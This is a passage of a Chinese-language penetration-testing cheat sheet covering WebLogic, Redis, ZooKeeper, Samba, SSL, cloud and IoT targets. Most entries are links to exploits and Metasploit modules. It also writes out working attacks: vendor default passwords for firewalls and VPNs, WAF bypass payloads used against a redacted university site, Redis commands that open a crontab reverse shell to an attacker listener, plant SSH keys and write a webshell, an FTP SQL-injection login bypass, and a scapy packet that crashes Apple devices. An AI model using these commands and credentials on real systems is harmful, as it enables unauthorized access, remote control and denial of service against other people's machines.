        - [blog-hugo/content/blog/Weblogic-0day.md](https://github.com/kylingit/blog-hugo/blob/master/content/blog/Weblogic-0day.md)

    - 检测方法
        访问`<目标IP:端口>/wls-wsat/CoordinatorPortType11`

    - POC | Payload | exp
        - [1337g/CVE-2017-10271](https://github.com/1337g/CVE-2017-10271)

- **CVE-2018-2628**
    - 文章
        - [CVE-2018-2628 简单复现与分析 | xxlegend](http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/)

    - POC | Payload | exp
        - [shengqi158/CVE-2018-2628](https://github.com/shengqi158/CVE-2018-2628)

- **CVE-2018-2893**
    - 文章
        - [天融信关于CVE-2018-2893 WebLogic反序列化漏洞分析](https://www.freebuf.com/column/178103.html)

    - POC | Payload | exp
        - [pyn3rd/CVE-2018-2893](https://github.com/pyn3rd/CVE-2018-2893)

- **CVE-2018-2894**
    - 文章
        - [Weblogic CVE-2018-2894 漏洞复现](https://blog.csdn.net/qq_23936389/article/details/81256015)

    - POC | Payload | exp
        - [LandGrey/CVE-2018-2894](https://github.com/LandGrey/CVE-2018-2894)

- **CVE-2018-3191**
    - 文章
        - [从流量侧浅谈WebLogic远程代码执行漏洞(CVE-2018-3191)](https://www.jianshu.com/p/f73b162c4649)

    - POC | Payload | exp
        - [voidfyoo/CVE-2018-3191](https://github.com/voidfyoo/CVE-2018-3191)

- **CVE-2018-3245**
    - 文章
        - [weblogic反序列化漏洞 cve-2018-3245](https://blog.51cto.com/13770310/2308371)

    - POC | Payload | exp
        - [pyn3rd/CVE-2018-3245](https://github.com/pyn3rd/CVE-2018-3245)

- **CVE-2019-2725 && CNVD-C-2019-48814**
    - 文章
        - [CNVD-C-2019-48814 Weblogic wls9_async_response 反序列化RCE复现](https://www.jianshu.com/p/c4982a845f55)

    - 检测方法
        ```bash
        <目标IP:端口>/_async/AsyncResponseService
        <目标IP:端口>/wls-wsat/CoordinatorPortType
        ```

    - POC | Payload | exp
        - [MyTools/CVE-2019-2725](https://github.com/No4l/MyTools/tree/master/CVE-2019-2725)
        - [skytina/CNVD-C-2019-48814-COMMON](https://github.com/skytina/CNVD-C-2019-48814-COMMON)
        - [lufeirider/CVE-2019-2725](https://github.com/lufeirider/CVE-2019-2725)

---

### 安防设备

#### 常见安服默认口令
```bash
天融信防火墙
8080
用户名:superman 密码:talent、talent!23
test/123456

联想网御防火墙
8889
用户名:admin    密码:leadsec@7766、administrator、bane@7766

深信服防火墙
用户名：admin   密码：admin

启明星辰
8889
用户名：admin   密码：bane@7766、admin@123

juniper
用户名:netscreen    密码:netscreen

Cisco
用户名:admin    密码:cisco

Huawei
用户名:admin    密码:Admin@123
eudemon eudemon

H3C
用户名:admin    密码:admin

绿盟IPS
用户名: weboper 密码: weboper

网神防火墙
用户名：admin   密码：firewall

华为VPN
账号：root  密码：mduadmin

迪普
admin/admin_default

山石
hillstone/hillstone

安恒明御防火墙
admin/adminadmin

齐治堡垒机
shterm/shterm
```

**Reference**
- [国内防火墙默认密码](https://www.qugcloud.cn/2018/05/19/firewall-pwd/)

#### 绕waf

**非默认端口导致完全绕过**

测试HTTPS服务
测试8080/8081等端口的服务

**路径限制绕过**

这只WAF会对访问敏感路径加以限制,但是加上参数可以绕过。
比如想访问`xxx.██.edu.cn/phpmyadmin/`会被拦截,访问`xxx.██.edu.cn/phpmyadmin/?id=1`可以绕过

**XSS防护绕过**

最直白的payload类似`<script> alert('xss'); </script>`
但是你可以用`<script src=来远程加载脚本,并绕过防护`
`http://██.██.edu.cn/██/██?search=naive%22%3E%20%3Cmeta%20name=%22referrer%22%20content=%22never%22%20%3E%20%3Cscript%20src=%22https://cdn.jsdelivr.net/gh/TomAPU/xsstest/test.js%22%3E%3C/script%3E%20%3C!--`

**SQL注入绕过**

Union注入时`union select 1 from 2`替换成`union/*fuckyou//*a*//*!select*/1/*fuckyou//*a*//*!from*/2`
order by测试时直接把空格换成`/**//**/`

**Reference**
- [██大学通用型WAF不完全绕过(持续非定期更新) ](https://drivertom.blogspot.com/2018/12/waf.html)

---

## 本地业务/软件类vul
### Andorid

**ESFileExplorers**
- **CVE-2019-6447**
    - POC | Payload | exp
        - [fs0c131y/ESFileExplorerOpenPortVuln](https://github.com/fs0c131y/ESFileExplorerOpenPortVuln)

---

### Linux

**Logwatch**
- **CVE-2011-1018 Logwatch logwatch.pl任意命令执行漏洞**
    - POC | Payload | exp
        - [Logwatch Log File - Special Characters Privilege Escalation](https://www.exploit-db.com/exploits/35386)

**vim**
- **CVE-2019-12735 Vim/Neovim Arbitrary Code Execution via Modelines**
    - POC | Payload | exp
        - [2019-06-04_ace-vim-neovim.md](https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md)

---

### Windows

**Evernote**
- **Evernote 7.9**
    - 文章
        - [Code execution – Evernote](https://securityaffairs.co/wordpress/84037/hacking/local-file-path-traversal-evernote.html)

**Firefox**
- **CVE-2019-9810**
    - POC | Payload | exp
        - [0vercl0k/CVE-2019-9810](https://github.com/0vercl0k/CVE-2019-9810)

**IE**
- **XML External Entity Injection**
    - POC | Payload | exp
        - http://hyp3rlinx.altervista.org/advisories/MICROSOFT-INTERNET-EXPLORER-v11-XML-EXTERNAL-ENTITY-INJECTION-0DAY.txt

**WinRAR**
- **CVE-2018-20250**
    - 文章
        - [Extracting a 19 Year Old Code Execution from WinRAR - Check Point Research](https://research.checkpoint.com/extracting-code-execution-from-winrar/)

    - POC | Payload | exp
        - [WyAtu/CVE-2018-20250](https://github.com/WyAtu/CVE-2018-20250)

---

## 对外业务/软件类vul
### 分布式

**Hadoop**
- **文章**
    - [Hadoop渗透及安全加固](http://www.polaris-lab.com/index.php/archives/187/)
    - [挖掘分布式系统——Hadoop的漏洞](https://zhuanlan.zhihu.com/p/28901633)

- **Hadoop 未授权访问**
    - 示例

        `curl -i -X PUT “http://ip:50070/webhdfs/v1/NODATA4U_SECUREYOURSHIT?op=MKDIRS“`

**ZooKeeper**
- **ZooKeeper 未授权访问漏洞**
    - 文章
        - [ZooKeeper 未授权访问漏洞](https://blog.csdn.net/qq_23936389/article/details/83826028)
        - [攻击大数据应用：ZooKeeper](http://www.polaris-lab.com/index.php/archives/41/)

    - 复现？
        ```bash
        wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz
        tar -zxvf zookeeper-3.4.14.tar.gz
        cd zookeeper-3.4.14/
        cd conf/
        ```
        ```vim
        vim zoo.cfg  # 配置单机模式

        tickTime=2000
        dataDir=/tmp/zookeeper/data
        dataLogDir=/tmp/zookeeper/logs
        clientPort=2181
        ```
        ```bash
        cd ..
        bin/zkServer.sh start   # 启动
        bin/zkCli.sh -server 127.0.0.1:2181 #连接 server
        ```

    - 利用
        ```bash
        echo envi|nc <ip> 2181 # 打印有关服务环境的详细信息
        echo dump |ncat <ip> 2181 # 列出未完成的会话和临时节点
        echo reqs |ncat <ip> 2181 # 列出未完成的请求
        echo ruok |ncat <ip> 2181 # 测试服务器是否运行在非错误状态
        echo stat |ncat <ip> 2181 # 列出关于性能和连接的客户端的统计信息

        ./zkCli.sh -server <ip>:port
        ```

- **CVE-2014-085 ZooKeeper信息泄露漏洞**
    - 文章
        - [ZooKeeper信息泄露漏洞(CVE-2014-085)](https://blog.csdn.net/u011721501/article/details/44062617)

---

### 数据库

**MS SQL Server**
- **文章**
    - [从攻击MS SQL Server到获得系统访问权限](https://www.freebuf.com/articles/database/22997.html)

**mysql**
- **UDF提权**
    - 文章
        - [Command execution with a MySQL UDF](http://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html)

    - POC | Payload | exp
        - [mysqludf/lib_mysqludf_sys](https://github.com/mysqludf/lib_mysqludf_sys)

**oracle**
- **CVE-2010-3600 Oracle Enterprise Manager Grid Control JSP代码执行漏洞**
    - MSF模块
        ```bash
        use exploit/windows/oracle/client_system_analyzer_upload
        ```

- **CVE-2012-1675 Oracle TNS Listener Remote Poisoning**
    - 文章
        - [Oracle TNS Listener Remote Poisoning](http://www.cnblogs.com/zhuxr/p/9618512.html)

    - MSF模块
        ```bash
        use auxiliary/admin/oracle/tnscmd   # 该漏洞可以远程获取到oracle的内存信息,若是能获取到内存中的数据即为存在漏洞。
        use auxiliary/admin/oracle/sid_brute  # 爆破oracle的SID
        ```

- **CVE-2012-5615 Oracle MySQL Server 5.5.19用户名枚举漏洞**
    - POC | Payload | exp
        - [MySQL - Remote User Enumeration](https://www.exploit-db.com/exploits/23081)
        - [MySQL 5.1/5.5 (Windows) - 'MySQLJackpot' Remote Command Execution](https://www.exploit-db.com/exploits/23073)

**OrientDB**
- **CVE-2017-11467**
    - 文章
        - [OrientDB远程代码执行漏洞POC分析以及复现|CVE-2017-11467](https://bbs.ichunqiu.com/thread-33175-1-18.html)

    - POC | Payload | exp
        - [OrientDB - Code Execution](https://www.exploit-db.com/exploits/44068)

**redis**
- **未授权访问漏洞**
    - 文章
        - [redis未授权访问漏洞利用总结](https://p0sec.net/index.php/archives/69/)
        - [Redis 未授权访问漏洞利用分析](https://hellohxk.com/blog/redis-unauthorized-vulnerability/)
        - [redis未授权访问与ssrf利用](https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/)
        - [Hackredis Enhanced Edition Script](https://joychou.org/web/hackredis-enhanced-edition-script.html#directory092928099425939341)

    - 搭建环境
        ```bash
        wget http://download.redis.io/releases/redis-3.2.0.tar.gz
        tar xzf redis-3.2.0.tar.gz
        cd redis-3.2.0
        make
        ```
        ```vim
        vim redis.conf

        #bind 127.0.0.1
        protected-mode no
        ```
        ```
        ./src/redis-server redis.conf
        ```

    - 利用
        ```sql
        redis-cli -h <目标IP>
        >info   # 查看redis版本信息、一些具体信息、服务器版本信息等等：
        >CONFIG GET dir # 获取默认的redis目录
        >CONFIG GET dbfilename # 获取默认的 rdb文件名
        ```

        **利用计划任务执行命令反弹shell**

        在redis以root权限运行时可以写crontab来执行命令反弹shell 先在自己的服务器上监听一个端口
        `nc -lvnp 7999`
        然后执行命令:
        ```bash
        > set x "\n* * * * * /bin/bash -i > /dev/tcp/192.168.72.129/7999 0<&1 2>&1\n"
        > config set dir /var/spool/cron/
        > config set dbfilename root
        > save
        ```

        **写ssh-keygen公钥然后使用私钥登陆**

        在以下条件下，可以利用此方法
        1. Redis服务使用ROOT账号启动
        2. 服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。

        首先在本地生成一对密钥
        `ssh-keygen -t rsa`
        然后执行命令:
        ```bash
        > config set dir /root/.ssh/
        > config set dbfilename authorized_keys
        > set x "\n\n\nssh-rsa <你的密钥> root@kali\n\n\n"
        > save
        ```
        save后可以直接利用公钥登录ssh

        **往web物理路径写webshell**

        当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell
        执行以下命令
        ```bash
        > config set dir /var/www/html/
        > config set dbfilename shell.php
        > set x "<?php phpinfo();?>"
        > save
        ```
        即可将shell写入web目录(web目录根据实际情况)

---

### 文件服务

**ftp**
- **Xlight FTP Server < 3.2.1 user参数SQL注入漏洞**
    - 简介

        在执行ODBC认证过程中Xlight FTP Server没有正确地过滤用户所提交的用户名和口令字段，远程攻击者可以用“OR ‘1’=’1’ ;#”替换用户名绕过认证登录到服务器。

    - 示例
        ```bash
        220 Xlight FTP Server 3.2 ready...
        User (server-4:(none)) : \' OR \'1\'=\'1\' ;#
        331 Password required for \' OR \'1\'=\'1\' ;#
        Password : type anything
        230 Login OK
        ftp&gt;
        ```

- **Serv-U FTP Server目录遍历漏洞**
    - 文章
        - [Serv-U FTP Server 0day漏洞分析报告](http://safe.it168.com/a2011/1213/1287/000001287577.shtml)

    - 示例
        ```bash
        ls ../windwos
            550 .....

        ls ..:/windows
            150 ....
            ...
            ...
        ```

**nfs**
- **CVE-1999-0554 目标主机showmount -e信息泄露**
    - 示例
        ```
        showmount -e xxx.xxx.xxx.xxx
        mount -t nfs xxx.xxx.xxx.xxx:/opt/applications/xxx_static_data  /mnt
        ```

    - MSF模块
        ```bash
        use auxiliary/scanner/nfs/nfsmount
        ```

**Rsync**
- **未授权访问**
    - 文章
        - [rsync的几则tips(渗透技巧)](http://www.91ri.org/11093.html)
        - [配置漏洞之Rsync匿名访问](https://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8BRsync%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE.html)

    - 示例

        `rsync <目标IP>::`

    - MSF模块
        ```bash
        use auxiliary/scanner/rsync/modules_list
        ```

**samba**
- **CVE-2015-0240**
    - MSF模块
        ```bash
        use auxiliary/scanner/smb/smb_uninit_cred
        ```

- **CVE-2017-7494**
    - 文章
        - [Linux cve-2017-7494samba远程漏洞利用和分析](https://bbs.pediy.com/thread-218114.htm)

    - POC | Payload | exp
        - [joxeankoret/CVE-2017-7494](https://github.com/joxeankoret/CVE-2017-7494)
        - [opsxcq/exploit-CVE-2017-7494](https://github.com/opsxcq/exploit-CVE-2017-7494)

    - MSF模块
        ```bash
        use exploit/linux/samba/is_known_pipename
        set rhost
        set target 3
        run
        ```

---

### 远程服务

**Java RMI**
- **JAVA RMI 反序列化远程命令执行漏洞**
    - 文章
        - []()

**OpenSSH**
- **CVE-2018-15473 OpenSSH 用户枚举漏洞**
    - 影响范围
        - OpenSSH 7.7及其以前版本

    - 文章
        - [OpenSSH用户枚举漏洞(CVE-2018-15473)分析](https://www.anquanke.com/post/id/157607)
        - [SSH用户枚举漏洞(CVE-2018-15473)原理学习](https://www.cnblogs.com/KevinGeorge/p/9530835.html)

    - POC | Payload | exp
        - [trimstray/massh-enum](https://github.com/trimstray/massh-enum)
        - [Rhynorater/CVE-2018-15473-Exploit](https://github.com/Rhynorater/CVE-2018-15473-Exploit)

    - MSF模块
        ```bash
        use auxiliary/scanner/ssh/ssh_enumusers
        ```

---

## 逻辑类vul
### web

**资源**
- [web逻辑漏洞挖掘快速入门到放弃](./文件/web逻辑漏洞挖掘快速入门到放弃.docx)

### mobile

`逻辑漏洞基本与web姿势相同`
- 任意号码注册
- 任意文件下载
- 任意文件上传
- 短信重置密码接口(短信轰炸)

---

## 协议类vul
### SNMP

- **文章**
    - [SNMP协议攻击](https://xz.aliyun.com/t/1562)
    - [渗透测试中如何收集利用SNMP协议数据](https://www.freebuf.com/articles/network/104522.html)

- **snmp弱口令**
    - 文章
        - [烂泥：使用snmpwalk采集设备的OID信息](https://www.ilanni.com/?p=8408)
        - [snmp弱口令引起的信息泄漏](http://drops.xmd5.com/static/drops/tips-409.html)

    - 利用

        安装 `yum -y install net-snmp-utils`

        Usage
        ```bash
        snmpwalk -v 2c -c public 192.168.xxx.xxx
        snmp-check 192.168.xxx.xxx -c public -v 2c
        ```

---

### SSL

- **文章**
    - [SSL＆TLS 安全性测试](https://4hou.win/wordpress/?p=2355)

- **工具**
    - [MassBleed](https://github.com/1N3/MassBleed)
    - [sslscan](https://github.com/rbsec/sslscan)
    - [testssl](https://github.com/drwetter/testssl.sh)

- **CVE-2014-3566 SSL 3.0 POODLE攻击信息泄露漏洞**
    - 文章
        - [CVE-2014-3566 SSLv3 POODLE原理分析](http://drops.xmd5.com/static/drops/papers-3194.html)

    - POC | Payload | exp
        - [mpgn/poodle-PoC](https://github.com/mpgn/poodle-PoC)

    - MSF模块
        ```
        use auxiliary/scanner/http/ssl_version
        ```

- **OpenSSL**
    - **CVE-2014-0160 Heartbleed**
        - 文章
            - [心脏滴血HeartBleed漏洞研究及其POC](https://www.cnblogs.com/KevinGeorge/p/8029947.html)
            - [OpenSSL心脏出血漏洞全回顾](https://www.freebuf.com/articles/network/32171.html)
            - [Heartbleed 实战：一个影响无数网站的缓冲区溢出漏洞](https://onebitbug.me/reproduced/2014/04/09/heartbleed-poc/)
            - [Heartbleed漏洞的复现与利用](https://blog.csdn.net/biziwaiwai/article/details/79323334)
            - [Heartbleed心脏出血漏洞靶场搭建](https://blog.csdn.net/yaofeino1/article/details/54377537)

        - POC | Payload | exp
            - [OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure](https://www.exploit-db.com/exploits/32745)

---

## 云渗透
### aws

**文章**
- [Attacking AWS: the full cyber kill chain](https://www.slideshare.net/wojdwo/attacking-aws-the-full-cyber-kill-chain-144590283)

**工具**
- [toniblyx/prowler](https://github.com/toniblyx/prowler)
- [RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu)
- [arkadiyt/aws_public_ips](https://github.com/arkadiyt/aws_public_ips)

**S3**
- **文章**
    - [How security researchers discover open Amazon S3 servers](https://www.devicelock.com/blog/how-security-researchers-discover-open-amazon-s3-servers.html)
    - [Blog, Whats in Amazon's buckets? - DigiNinja](https://digi.ninja/blog/whats_in_amazons_buckets.php)
    - [Bucket Finder - DigiNinja](https://digi.ninja/projects/bucket_finder.php)

- **工具**
    - [gwen001/s3-buckets-finder](https://github.com/gwen001/s3-buckets-finder)
    - [brianwarehime/inSp3ctor](https://github.com/brianwarehime/inSp3ctor)
    - [PayloadsAllTheThings/AWS Amazon Bucket S3](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AWS%20Amazon%20Bucket%20S3)
    - [eth0izzle/bucket-stream](https://github.com/eth0izzle/bucket-stream)

---

# 7工控/IoT/物理
## 资源
**漏洞库**
- [工控系统行业漏洞库平台](http://ivd.winicssec.com/index.php/Home/Search/index.html)

## CPU
**Meltdown/Spectre**
- 文章
    - [An Explanation of the Meltdown/Spectre Bugs for a Non-Technical Audience](https://blog.cloudflare.com/meltdown-spectre-non-technical/)
    - [简单谈谈近期的Intel处理器漏洞](https://bbs.kafan.cn/thread-2112818-1-1.html)

- POC | Payload | exp
    - [speed47/spectre-meltdown-checker](https://github.com/speed47/spectre-meltdown-checker)

---

## 射频/无线
鸽

---

## 物联网设备
### Printer

**PRET**

Installation
```bash
git clone https://github.com/RUB-NDS/PRET.git
cd PRET

pip install colorama pysnmp
```

Usage
```bash
python2 ./pret.py
python2 ./pret.py xxx.xxx.xxx.xxx pjl
python2 ./pret.py xxx.xxx.xxx.xxx ps
python2 ./pret.py xxx.xxx.xxx.xxx pcl
```

---

### Router/Switch

**漏洞库**
- [Routerpwn - One click exploits, generators, tools, news, vulnerabilities, poc, alerts](http://routerpwn.com/)

**案例**
- [Assessing the security of a portable router: a look inside its hardware - Malwarebytes Labs | Malwarebytes Labs](https://blog.malwarebytes.com/security-world/technology/2018/09/security-portable-router-inside-hardware/)

**工具**
- **routersoloit**

    Installation
    ```bash
    git clone https://www.github.com/threat9/routersploit.git
    cd routersploit
    python3 -m pip install -r requirements.txt
    python3 rsf.py
    ```

    Usage
    ```bash
    use scanners/autopwn
    set target
    run
    ```

---

# 8MobileSec
## IOS
### VUL

- **CVE-2018-4407**
    - 文章
        - [远程打挂所有的apple设备 — CVE-2018-4407分析](https://mabin004.github.io/2018/11/01/%E8%BF%9C%E7%A8%8B%E6%89%93%E6%8C%82%E6%89%80%E6%9C%89%E7%9A%84apple%E8%AE%BE%E5%A4%87-CVE-2018-4407-%E5%88%86%E6%9E%90/)

    - POC | Payload | exp
        ```bash
        $sudo scapy
        >>send(IP(dst="192.168.1.151",options=[IPOption("A"*8)])/TCP(dport=8888,options=[(19, "1"*33)]))
        ```

---

`你以为很多事是可以重复的,还有下一次,但你错了。包括你儿时的万花筒或纸飞机,抄作业或买糖果,早就是此生的最后一次。(韩少功 《日夜书》) `
